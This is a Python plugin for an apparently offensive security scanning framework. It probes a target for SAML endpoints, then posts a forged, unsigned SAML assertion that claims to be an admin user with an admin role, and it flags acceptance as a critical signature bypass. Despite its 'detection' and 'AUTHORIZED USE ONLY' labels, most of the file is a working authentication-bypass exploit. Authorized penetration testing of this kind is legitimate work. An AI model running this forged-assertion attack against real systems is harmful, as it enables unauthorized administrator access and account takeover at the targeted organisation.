#!/usr/bin/env python3
# plugins/plugin_saml_bypass.py — SAML Bypass Detection (requires --lab)
# MilkyWay Intelligence | Author: Sharlix | AUTHORIZED USE ONLY
import re, base64, urllib.parse
from core.base_step import BasePlugin
from core.http_client import sync_get, sync_post
from core.error_handler import get_handler

SAML_PATHS=["/saml/acs","/saml2/acs","/sso/saml","/auth/saml/callback",
            "/api/sso","/login/saml","/_auth/saml","/saml/consume"]

MINIMAL_SAML="""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0">
  <saml:Issuer>{T}</saml:Issuer>
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion Version="2.0" ID="m7_001">
    <saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
      admin@{T}</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z"/>
    <saml:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z"/>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>"""

class PluginSAMLBypass(BasePlugin):
    PLUGIN_NAME="saml_bypass"; PLUGIN_VERSION="1.0"
    name="plugin_saml_bypass"; description="SAML bypass detection"
    requires_lab=True

    def run(self):
        self.log.info("[SAML] Starting SAML bypass detection")
        endpoints = self._discover()
        if not endpoints:
            self.log.info("[SAML] No SAML endpoints found"); return
        for ep in endpoints[:5]:
            try: self._test_unsigned(ep)
            except Exception as e: get_handler().capture("saml_bypass",e,f"unsigned:{ep}")

    def _discover(self):
        found=[]; h={"User-Agent":"Mozilla/5.0","Accept":"text/html,*/*"}
        for path in SAML_PATHS:
            url=f"https://{self.target}{path}"
            try:
                r=sync_get(url,headers=h,timeout=7)
                if r and r.get("status") in (200,302,400,405,422):
                    if re.search(r"saml|sso|assertion|IdP",r.get("body",""),re.I) or r.get("status")==405:
                        found.append(url); self.log.info(f"[SAML] Endpoint: {url}")
            except Exception as _e:
                from core.error_handler import get_handler
                get_handler().capture("plugin_saml_bypass", _e)
        return found

    def _test_unsigned(self, endpoint):
        xml=MINIMAL_SAML.replace("{T}",self.target)
        enc=base64.b64encode(xml.encode()).decode()
        h={"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"}
        if getattr(self.args,"cookie",None): h["Cookie"]=self.args.cookie
        try:
            payload=f"SAMLResponse={urllib.parse.quote(enc)}&RelayState=/"
            r=sync_post(endpoint,data=payload,headers=h,timeout=10)
            if r and self._is_success(r.get("body",""),r.get("status",0)):
                self.add_finding("SAML_SIGNATURE_BYPASS",endpoint,
                    f"Unsigned SAML accepted|status={r.get('status')}",0.92,"critical")
                self.log.warn(f"[SAML] UNSIGNED SAML ACCEPTED: {endpoint}")
        except Exception as e:
            get_handler().capture("saml_bypass",e,f"test_unsigned:{endpoint}")

    def _is_success(self, body, status):
        if status in (302,303): return True
        return any(re.search(p,body,re.I) for p in
            [r'"authenticated"\s*:\s*true',r'"success"\s*:\s*true',
             r"dashboard",r"welcome",r"logout"])
